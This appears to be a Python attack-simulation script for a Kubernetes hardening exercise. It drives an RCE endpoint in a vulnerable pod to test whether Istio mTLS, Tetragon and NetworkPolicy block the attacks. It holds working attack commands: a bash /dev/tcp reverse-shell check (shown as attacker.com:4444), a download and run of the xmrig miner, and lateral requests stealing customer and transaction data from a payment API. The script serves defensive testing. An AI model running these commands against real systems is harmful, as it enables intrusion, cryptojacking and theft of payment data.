#!/usr/bin/env python3
"""
Kubernetes Attack Simulation - Day 3
Theme: "The Attacker is INSIDE Your Pod"

This script demonstrates attacks that will be blocked by:
- Day 1: NetworkPolicy (metadata access, external egress), RBAC (secret access)
- Day 2: PSS Restricted (container escape), SA token disable
- Day 3: Istio mTLS (lateral movement), Tetragon (runtime)

Day 3 focuses on lateral movement to internal services and runtime attacks.

Usage:
    python3 attack_day3.py --rce-url http://<phoenix-endpoint>/<secret-path>/
"""

import requests
import argparse
import json
import sys
import re
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== CONFIGURATION ====================

RCE_URL = None
NAMESPACE = "production"
PAYMENT_API_IP = None  # Discovered during attack 1


# ==================== COLORS & FORMATTING ====================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


def banner():
    """Print the main banner"""
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}        KUBERNETES ATTACK SIMULATION - DAY 3               {Colors.RED}║
║{Colors.YELLOW}        "The Attacker is INSIDE Your Pod"                  {Colors.RED}║
╚═══════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def section_header(title):
    """Print a section header"""
    print(f"""
{Colors.MAGENTA}══════════════════════════════════════════════════════════════
 {title}
══════════════════════════════════════════════════════════════{Colors.RESET}
""")


def print_attack_header(num, total, name, description):
    """Print attack section header"""
    print(f"\n{Colors.CYAN}[{num}/{total}] {Colors.BOLD}{name}{Colors.RESET}")
    print(f"{Colors.DIM}      {description}{Colors.RESET}")
    print(f"{Colors.DIM}      {'─' * 52}{Colors.RESET}")


def print_command(cmd):
    """Print the command being executed"""
    # Truncate long commands
    display_cmd = cmd.strip().replace('\n', ' ')
    if len(display_cmd) > 70:
        display_cmd = display_cmd[:67] + "..."
    print(f"{Colors.DIM}      $ {display_cmd}{Colors.RESET}")


def success(msg, details=None):
    """Print success message"""
    print(f"\n{Colors.GREEN}      ✅ ATTACK SUCCEEDED{Colors.RESET}")
    print(f"{Colors.GREEN}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.GREEN}      → {detail}{Colors.RESET}")


def blocked(msg, details=None):
    """Print blocked message"""
    print(f"\n{Colors.RED}      ❌ ATTACK BLOCKED{Colors.RESET}")
    print(f"{Colors.RED}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.RED}      → {detail}{Colors.RESET}")


def info(msg):
    """Print info message"""
    print(f"{Colors.YELLOW}      ℹ {msg}{Colors.RESET}")


def print_summary(results):
    """Print final summary for Day 3"""
    total = len(results)
    succeeded = sum(1 for r in results if r['success'])
    failed = total - succeeded

    if succeeded == 0:
        status = f"{Colors.GREEN}🟢 DAY 3 HARDENED{Colors.RESET}"
        status_msg = "All lateral movement & runtime attacks blocked!"
    elif succeeded == total:
        status = f"{Colors.RED}🔴 FULLY VULNERABLE{Colors.RESET}"
        status_msg = "Lateral movement & runtime attacks possible!"
    else:
        status = f"{Colors.YELLOW}🟡 PARTIALLY HARDENED{Colors.RESET}"
        status_msg = "Some Day 3 defenses in place"

    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}                        SUMMARY                            {Colors.RED}║
╠═══════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.GREEN}✅ Blocked attacks:{Colors.RESET}    {failed:>2}/{total:<27}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.RED}❌ Successful attacks:{Colors.RESET} {succeeded:>2}/{total:<27}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  Status: {status:<49}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {status_msg:<57}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}""")

    # Show what's still vulnerable
    vulnerable = [r['name'] for r in results if r['success']]
    if vulnerable:
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}Still vulnerable to:{Colors.RESET}                                    {Colors.RED}║{Colors.RESET}")
        for v in vulnerable[:5]:
            print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• {v:<55}{Colors.RESET}{Colors.RED}║{Colors.RESET}")
        if len(vulnerable) > 5:
            print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• ... and {len(vulnerable) - 5} more{Colors.RESET}                                        {Colors.RED}║{Colors.RESET}")

    # Show defenses needed
    if succeeded > 0:
        print(f"{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}Apply Day 3 defenses:{Colors.RESET}                                  {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• Istio mTLS + AuthorizationPolicy{Colors.RESET}                     {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• Tetragon runtime policies{Colors.RESET}                            {Colors.RED}║{Colors.RESET}")

    if succeeded == 0:
        print(f"{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.GREEN}✅ Day 3 defenses working!{Colors.RESET}                             {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.GREEN}🎉 RCE exists but attacker can do NOTHING useful!{Colors.RESET}     {Colors.RED}║{Colors.RESET}")

    print(f"{Colors.RED}╚═══════════════════════════════════════════════════════════╝{Colors.RESET}")


# ==================== RCE HELPER ====================

def html_unescape(text):
    """Unescape HTML entities"""
    text = text.replace('&gt;', '>')
    text = text.replace('&lt;', '<')
    text = text.replace('&amp;', '&')
    text = text.replace('&#39;', "'")
    text = text.replace('&#34;', '"')
    text = text.replace('&quot;', '"')
    return text


def rce(cmd):
    """
    Execute command via RCE endpoint, return output.
    Parses HTML response to extract command output.
    """
    try:
        response = requests.post(
            RCE_URL,
            data={"cmd": cmd},
            timeout=60,  # Longer timeout for xmrig download
            verify=False
        )

        # Parse output from HTML response
        # Format: <pre>$ cmd\noutput</pre>
        html = response.text

        # Extract content between <pre> tags
        match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
        if match:
            content = match.group(1)
            # Unescape HTML entities
            content = html_unescape(content)
            # Remove the first line ($ command)
            lines = content.split('\n', 1)
            if len(lines) > 1:
                return lines[1].strip()
            return ""
        return html

    except requests.exceptions.Timeout:
        return "ERROR: Connection timeout"
    except requests.exceptions.ConnectionError:
        return "ERROR: Connection failed"
    except Exception as e:
        return f"ERROR: {str(e)}"


# ==================== DAY 3 ATTACKS ====================

def discover_payment_api():
    """Discover payment-api service via env vars or DNS (prerequisite for lateral movement)"""
    global PAYMENT_API_IP

    print(f"\n{Colors.CYAN}{'─' * 58}{Colors.RESET}")
    print(f"{Colors.CYAN}  Discovering payment-api service for lateral movement...{Colors.RESET}")
    print(f"{Colors.CYAN}{'─' * 58}{Colors.RESET}")

    # Method 1: Environment variables (K8s auto-injects these!)
    cmd = 'echo $PAYMENT_API_SERVICE_HOST'
    print_command("echo $PAYMENT_API_SERVICE_HOST")

    output = rce(cmd)

    if output and "." in output and not output.startswith("ERROR"):
        PAYMENT_API_IP = output.strip()
        info(f"Found payment-api at {PAYMENT_API_IP} (env var)")
        return

    # Method 2: DNS resolution (CoreDNS)
    cmd2 = 'getent hosts payment-api.payments 2>/dev/null | awk "{print \\$1}" || echo "DNS_FAILED"'
    print_command("getent hosts payment-api")

    output2 = rce(cmd2)

    if "DNS_FAILED" not in output2 and output2 and "." in output2:
        PAYMENT_API_IP = output2.strip().split()[0]
        info(f"Found payment-api at {PAYMENT_API_IP} (DNS)")
        return

    # Method 3: Just use DNS name directly (most realistic)
    cmd3 = '''python3 -c "import urllib.request; print(urllib.request.urlopen('http://payment-api.payments:8080/health',timeout=2).read().decode())" 2>/dev/null || echo "CONN_FAILED"'''
    print_command("python3 urllib.request http://payment-api.payments:8080/health")

    output3 = rce(cmd3)

    if output3 and "CONN_FAILED" not in output3 and ("health" in output3.lower() or "ok" in output3.lower() or "{" in output3):
        PAYMENT_API_IP = "payment-api.payments"  # Use DNS name with namespace
        info("payment-api reachable via DNS name")
        return

    info("Could not discover payment-api (NetworkPolicy may be blocking)")


def attack_lateral_transactions(attack_num, total):
    """Steal transaction data from payment-api /transactions endpoint"""
    name = "Lateral Movement - Steal Transactions"
    description = "Access payment-api /transactions to steal PII and payment data"

    print_attack_header(attack_num, total, name, description)

    if not PAYMENT_API_IP:
        blocked("Cannot attempt - payment-api IP not discovered")
        return {"name": name, "success": False}

    cmd = f'''python3 -c "import urllib.request; print(urllib.request.urlopen('http://{PAYMENT_API_IP}:8080/transactions',timeout=5).read().decode())" 2>/dev/null || echo "CONNECTION_FAILED"'''
    print_command(f"python3 urllib.request http://{PAYMENT_API_IP}:8080/transactions")

    output = rce(cmd)

    if "CONNECTION_FAILED" in output or "Connection refused" in output or "Connection reset" in output:
        blocked("Lateral movement blocked", ["Istio mTLS blocking unauthorized access"])
        return {"name": name, "success": False}
    elif "transactions" in output.lower() or "amount" in output.lower() or "customer" in output.lower():
        try:
            data = json.loads(output)
            txns = data.get('transactions', [])
            details = [f"Found {len(txns)} transactions"]
            if txns:
                txn = txns[0]
                if 'customer_email' in txn:
                    details.append(f"Customer: {txn['customer_email']}")
                if 'amount' in txn:
                    details.append(f"Amount: ${txn['amount']}")
            success("TRANSACTION DATA STOLEN!", details)
        except:
            success("Got transaction data", [output[:100] + "..." if len(output) > 100 else output])
        return {"name": name, "success": True}
    elif not output or "timed out" in output.lower():
        blocked("Connection timed out")
        return {"name": name, "success": False}
    else:
        if len(output) > 10:
            success("Reached payment-api /transactions")
            return {"name": name, "success": True}
        blocked("Unexpected response")
        return {"name": name, "success": False}


def attack_lateral_customers(attack_num, total):
    """Steal customer data from payment-api /customers endpoint"""
    name = "Lateral Movement - Steal Customer Data"
    description = "Access payment-api /customers to steal card tokens and PII"

    print_attack_header(attack_num, total, name, description)

    if not PAYMENT_API_IP:
        blocked("Cannot attempt - payment-api IP not discovered")
        return {"name": name, "success": False}

    cmd = f'''python3 -c "import urllib.request; print(urllib.request.urlopen('http://{PAYMENT_API_IP}:8080/customers',timeout=5).read().decode())" 2>/dev/null || echo "CONNECTION_FAILED"'''
    print_command(f"python3 urllib.request http://{PAYMENT_API_IP}:8080/customers")

    output = rce(cmd)

    if "CONNECTION_FAILED" in output or "Connection refused" in output or "Connection reset" in output:
        blocked("Lateral movement blocked", ["Istio mTLS required"])
        return {"name": name, "success": False}
    elif "customers" in output.lower() or "card" in output.lower() or "email" in output.lower():
        try:
            data = json.loads(output)
            customers = data.get('customers', [])
            details = [f"Found {len(customers)} customer records"]
            if customers:
                cust = customers[0]
                if 'email' in cust:
                    details.append(f"Email: {cust['email']}")
                if 'card_token' in cust:
                    details.append(f"Card token: {cust['card_token']}")
            success("CUSTOMER DATA STOLEN!", details)
        except:
            success("Got customer data", [output[:100] + "..." if len(output) > 100 else output])
        return {"name": name, "success": True}
    elif not output or "timed out" in output.lower():
        blocked("Connection timed out")
        return {"name": name, "success": False}
    else:
        if len(output) > 10:
            success("Reached payment-api /customers")
            return {"name": name, "success": True}
        blocked("Unexpected response")
        return {"name": name, "success": False}


def attack_reverse_shell(attack_num, total):
    """Test if reverse shell connection is possible"""
    name = "Reverse Shell Check"
    description = "Test outbound TCP connection capability (/dev/tcp)"

    print_attack_header(attack_num, total, name, description)

    # Test /dev/tcp against a known port (80) that will respond
    # 34.117.59.81 = ifconfig.me (reliable, port 80 open, not a DNS server)
    # Tests if bash /dev/tcp works AND if egress is allowed
    cmd = 'bash -c "exec 3<>/dev/tcp/34.117.59.81/80 && echo CONNECTION_SUCCESS" 2>&1 || echo "CONNECTION_FAILED"'
    print_command('bash -c "exec 3<>/dev/tcp/attacker.com/4444"  # simulated')

    output = rce(cmd)

    # Check various outcomes
    if "Killed" in output:
        # Tetragon killed the process
        blocked("Reverse shell attempt killed", ["Tetragon detected /dev/tcp network access", "Runtime security blocked the attack"])
        return {"name": name, "success": False}
    elif "CONNECTION_SUCCESS" in output:
        # TCP connection succeeded - reverse shell IS possible
        success("Reverse shell capability confirmed!", [
            "bash /dev/tcp works for outbound TCP",
            "Successfully connected to external host",
            "Attacker can establish reverse shell!"
        ])
        return {"name": name, "success": True}
    elif "CONNECTION_FAILED" in output:
        # Connection failed - could be NetworkPolicy or other block
        blocked("Outbound TCP blocked", ["NetworkPolicy or firewall blocking egress", "Cannot establish reverse shell"])
        return {"name": name, "success": False}
    elif "Connection refused" in output:
        # Port closed but egress works
        success("Reverse shell capability confirmed!", [
            "TCP egress works (connection refused = reachable)",
            "Attacker can connect to listening ports"
        ])
        return {"name": name, "success": True}
    elif "timed out" in output.lower():
        # NetworkPolicy might be blocking
        blocked("Outbound TCP blocked", ["Connection timed out", "Egress blocked"])
        return {"name": name, "success": False}
    else:
        # Check for success indicators
        if "success" in output.lower():
            success("Reverse shell possible")
            return {"name": name, "success": True}
        blocked("Reverse shell test failed", [output[:50] if output else "Unknown error"])
        return {"name": name, "success": False}


def attack_cryptominer(attack_num, total):
    """Download and execute crypto miner binary"""
    name = "Crypto Miner (xmrig)"
    description = "Download xmrig from GitHub, extract, and execute"

    print_attack_header(attack_num, total, name, description)

    # Step 1: Check if xmrig is already present from a previous run
    check_cmd = 'ls /tmp/xmrig-*/xmrig 2>/dev/null && echo "XMRIG_EXISTS" || echo "XMRIG_MISSING"'
    print_command("ls /tmp/xmrig-*/xmrig")
    check_output = rce(check_cmd)

    if "XMRIG_EXISTS" in check_output:
        info("xmrig already present from previous run, skipping download")
    else:
        # Step 2: Download xmrig
        xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        dl_cmd = f'''python3 -c "import urllib.request,ssl,os; ctx=ssl._create_unverified_context(); r=urllib.request.urlopen('{xmrig_url}',timeout=30,context=ctx); d=r.read(); f=open('/tmp/xmrig.tar.gz','wb'); f.write(d); f.close(); print('size:',os.path.getsize('/tmp/xmrig.tar.gz')); print('DOWNLOAD_OK')" 2>/dev/null || echo "DOWNLOAD_FAILED"'''
        print_command("python3 urllib.request.urlopen xmrig -> /tmp/xmrig.tar.gz")
        dl_output = rce(dl_cmd)

        if "Killed" in dl_output:
            blocked("Download killed by Tetragon", ["Runtime security detected crypto miner download"])
            return {"name": name, "success": False}
        elif "DOWNLOAD_FAILED" in dl_output or "timed out" in dl_output.lower():
            blocked("Cannot download xmrig", ["NetworkPolicy blocking github.com", "Egress to external sites blocked"])
            return {"name": name, "success": False}
        elif "DOWNLOAD_OK" not in dl_output:
            blocked("Download failed", [dl_output[:60] if dl_output else "Unknown error"])
            return {"name": name, "success": False}

        size_match = re.search(r'size:\s*(\d+)', dl_output)
        size = size_match.group(1) if size_match else "?"
        info(f"Downloaded {size} bytes, extracting...")

        # Step 3: Extract
        extract_cmd = 'cd /tmp && tar -xzf xmrig.tar.gz 2>&1 || echo "EXTRACT_FAILED"'
        print_command("tar -xzf /tmp/xmrig.tar.gz")
        extract_output = rce(extract_cmd)

        if "EXTRACT_FAILED" in extract_output:
            blocked("Cannot extract xmrig", [extract_output[:60] if extract_output else "Unknown error"])
            return {"name": name, "success": False}

    # Step 4: Execute
    exec_cmd = '/tmp/xmrig-*/xmrig --version 2>&1 | head -3 || echo "EXEC_FAILED"'
    print_command("./xmrig --version")
    output = rce(exec_cmd)

    if "XMRig" in output or "xmrig" in output.lower():
        version_match = re.search(r'XMRig\s+(\d+\.\d+\.\d+)', output)
        version = version_match.group(1) if version_match else "?"
        success("CRYPTO MINER EXECUTED!", [
            f"xmrig version {version} running",
            "Could start mining cryptocurrency",
            "Full crypto-jacking attack possible"
        ])
        return {"name": name, "success": True}
    elif "Killed" in output:
        blocked("xmrig execution killed", ["Tetragon detected crypto miner process", "Runtime security working!"])
        return {"name": name, "success": False}
    elif "Permission denied" in output:
        blocked("Cannot execute binary", ["Execute permission denied"])
        return {"name": name, "success": False}
    elif "EXEC_FAILED" in output or "No such file" in output or "not found" in output.lower():
        blocked("Cannot execute xmrig", ["Binary not found or execution blocked"])
        return {"name": name, "success": False}
    else:
        if output and len(output) > 5 and "EXEC_FAILED" not in output:
            info(f"Output: {output[:60]}")
        blocked("Execution failed", [output[:50] if output else "Unknown error"])
        return {"name": name, "success": False}


# ==================== MAIN ====================

def main():
    global RCE_URL

    parser = argparse.ArgumentParser(
        description='Kubernetes Attack Simulation - Day 3',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 attack_day3.py --rce-url http://phoenix.example.com/debug/
  python3 attack_day3.py --rce-url http://10.0.0.5:8080/secret123/
        """
    )
    parser.add_argument(
        '--rce-url',
        required=True,
        help='RCE endpoint URL (e.g., http://host/<secret-path>/)'
    )

    args = parser.parse_args()
    RCE_URL = args.rce_url.rstrip('/') + '/'

    # Print banner
    banner()

    print(f"{Colors.DIM}Target: {RCE_URL}{Colors.RESET}")
    print(f"{Colors.DIM}Testing connection...{Colors.RESET}")

    # Test connection
    test_output = rce("echo CONNECTION_OK")
    if "CONNECTION_OK" not in test_output:
        print(f"\n{Colors.RED}ERROR: Could not connect to RCE endpoint{Colors.RESET}")
        print(f"{Colors.RED}Response: {test_output[:100]}{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.GREEN}Connected successfully!{Colors.RESET}")

    # Day 3 has 4 attacks focused on lateral movement & runtime
    TOTAL_ATTACKS = 4

    results = []

    # Run Day 3 attacks
    results.append(attack_reverse_shell(1, TOTAL_ATTACKS))
    results.append(attack_cryptominer(2, TOTAL_ATTACKS))

    # Discover payment-api (not an attack, just a prerequisite for lateral movement)
    discover_payment_api()

    results.append(attack_lateral_transactions(3, TOTAL_ATTACKS))
    results.append(attack_lateral_customers(4, TOTAL_ATTACKS))

    # Print summary
    print_summary(results)

    # Exit with appropriate code
    succeeded = sum(1 for r in results if r['success'])
    if succeeded == 0:
        sys.exit(0)  # All blocked = success (hardened)
    else:
        sys.exit(1)  # Some attacks succeeded = vulnerable


if __name__ == "__main__":
    main()
